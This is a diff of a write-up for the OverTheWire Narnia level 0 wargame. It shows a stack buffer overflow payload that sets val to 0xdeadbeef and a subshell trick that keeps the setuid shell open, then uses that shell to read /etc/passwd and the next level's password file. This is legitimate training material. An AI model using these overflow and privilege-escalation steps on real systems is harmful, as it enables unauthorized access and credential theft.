@@ -103,26 +103,113 @@ narnia.labs.overthewire.org
 >val: 0xdeadbeef  
 >```
 >
-> Well, we didn't get the ```WAY OFF!!!``` message, but no shell. I actually spent a good bit of time at this stage, but learned a few key concepts in doing so.  The shell is being launched, but the problem is it's exiting before we have a chance to run anything.  We can prove that by trying to concatenate a second command to run.
+> Well, we didn't get the ```WAY OFF!!!``` message, but no shell. I actually spent a good bit of time at this stage, but learned a few key concepts in doing so.  The shell is being launched, but the problem is that it's exiting before we have a chance to run anything.  What we need to do is use the subshell syntax in bash and try to group commands together.  Let's try that with a basic command.
 > 
 >```
-># python -c 'print "R"*20+"\xef\xbe\xad\xde"';whoami | ./narnia0  
->RRRRRRRRRRRRRRRRRRRRﾭ  
->Correct val's value from 0x41414141 -> 0xdeadbeef!  
->Here is your chance: buf: root  
->val: 0x41414141  
->WAY OFF!!!!  
+>narnia0@melinda:/narnia$ (python -c 'print "A"*20+"\xef\xbe\xad\xde"';ls) | ./narnia0 
+>Correct val's value from 0x41414141 -> 0xdeadbeef!
+>Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ
+>val: 0xdeadbeef
+>/bin/sh: 1: narnia0: not found
+>/bin/sh: 2: narnia0.c: not found
+>/bin/sh: 3: narnia1: not found
+>/bin/sh: 4: narnia1.c: not found
+>/bin/sh: 5: narnia2: not found
+>/bin/sh: 6: narnia2.c: not found
+>/bin/sh: 7: narnia3: not found
+>/bin/sh: 8: narnia3.c: not found
+>/bin/sh: 9: narnia4: not found
+>/bin/sh: 10: narnia4.c: not found
+>/bin/sh: 11: narnia5: not found
+>/bin/sh: 12: narnia5.c: not found
+>/bin/sh: 13: narnia6: not found
+>/bin/sh: 14: narnia6.c: not found
+>/bin/sh: 15: narnia7: not found
+>/bin/sh: 16: narnia7.c: not found
+>/bin/sh: 17: narnia8: not found
+>/bin/sh: 18: narnia8.c: not found
 >```
 >
-> We can see that when it shows us what the buf looks like it shows ```root``` which is the result of the whoami command.  We can try a few other things too.
+> Now this looks a little better.  It looks like the output from ```ls``` was passed into the /bin/sh from narnia0. Here we can utilize the ```cat``` command with no parameters which will basically leave the input open for us to pass values to /bin/sh.
 >
 >```
-># python -c 'print "R"*20+"\xef\xbe\xad\xde"';cat /etc/passwd | ./narnia0  
->RRRRRRRRRRRRRRRRRRRRﾭ  
->Correct val's value from 0x41414141 -> 0xdeadbeef!  
->Here is your chance: buf: root:x:0:0:root:/root:/b  
->val: 0x622f3a74  
->WAY OFF!!!!  
+>narnia0@melinda:/narnia$ (python -c 'print "A"*20+"\xef\xbe\xad\xde"';cat) | ./narnia0 
+>Correct val's value from 0x41414141 -> 0xdeadbeef!
+>Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ
+>val: 0xdeadbeef
+>whoami
+>narnia1
+>pwd 
+>/narnia
 >```
 >
-> Clearly we are able to run commands.  Up to now, I have been running this locally, so let's see if we can do this on the server and find the flag.
+> Finally. The ```cat``` command left the input open for us and everything we passed was executed by /bin/sh as a separate command.  Now we just need to find where the flag may be.
+>
+>```
+>narnia0@melinda:/narnia$ find / -name 'narnia*' -print 2>/dev/null
+>/games/narnia
+>/games/narnia/narnia8
+>/games/narnia/narnia6.c
+>/games/narnia/narnia6
+>/games/narnia/narnia3
+>/games/narnia/narnia7
+>/games/narnia/narnia4
+>/games/narnia/narnia2.c
+>/games/narnia/narnia3.c
+>/games/narnia/narnia1
+>/games/narnia/narnia5
+>/games/narnia/narnia4.c
+>/games/narnia/narnia5.c
+>/games/narnia/narnia0
+>/games/narnia/narnia2
+>/games/narnia/narnia1.c
+>/games/narnia/narnia7.c
+>/games/narnia/narnia8.c
+>/games/narnia/narnia0.c
+>/etc/narnia_pass
+>/etc/narnia_pass/narnia3
+>/etc/narnia_pass/narnia7
+>/etc/narnia_pass/narnia5
+>/etc/narnia_pass/narnia1
+>/etc/narnia_pass/narnia8
+>/etc/narnia_pass/narnia6
+>/etc/narnia_pass/narnia9
+>/etc/narnia_pass/narnia0
+>/etc/narnia_pass/narnia2
+>/etc/narnia_pass/narnia4
+>/narnia
+>/home/narnia3
+>/home/narnia7
+>/home/narnia5
+>/home/narnia1
+>/home/narnia8
+>/home/narnia6
+>/home/narnia9
+>/home/narnia0
+>/home/narnia2
+>/home/narnia4
+>```
+>
+> The ```find / -name 'narnia*'``` is a fairly basic command.  The ```-print 2>/dev/null``` is basically just there to eliminate any errors that may clutter the output.  Out of our results the most promising is the ```/etc/narnia_pass``` directory that looks like there is a password document for each challenge.  Since we already have the password for narnia0, let's try to grab the narnia1 password.
+>
+>```
+>narnia0@melinda:/narnia$ cat /etc/narnia_pass/narnia1
+>cat: /etc/narnia_pass/narnia1: Permission denied
+>narnia0@melinda:/narnia$ ls -l /etc/narnia_pass/narnia1
+>-r-------- 1 narnia1 narnia1 11 Nov 14  2014 /etc/narnia_pass/narnia1
+>narnia0@melinda:/narnia$ ls -l narnia0
+>-r-sr-x--- 1 narnia1 narnia0 7452 Nov 14  2014 narnia0
+>```
+>
+> We can't just ```cat``` the narnia1 password because we don't have permissions but it looks like the narnia0 challege runs under narnia1.  Let's use our subshell trick and try to read the password.
+>
+>```
+>narnia0@melinda:/narnia$ (python -c 'print "A"*20+"\xef\xbe\xad\xde"';cat) | ./narnia0 
+>Correct val's value from 0x41414141 -> 0xdeadbeef!
+>Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ
+>val: 0xdeadbeef
+>cat /etc/narnia_pass/narnia1
+>**********
+>```
+>
+> There we go. Finally got it. On to narnia1.
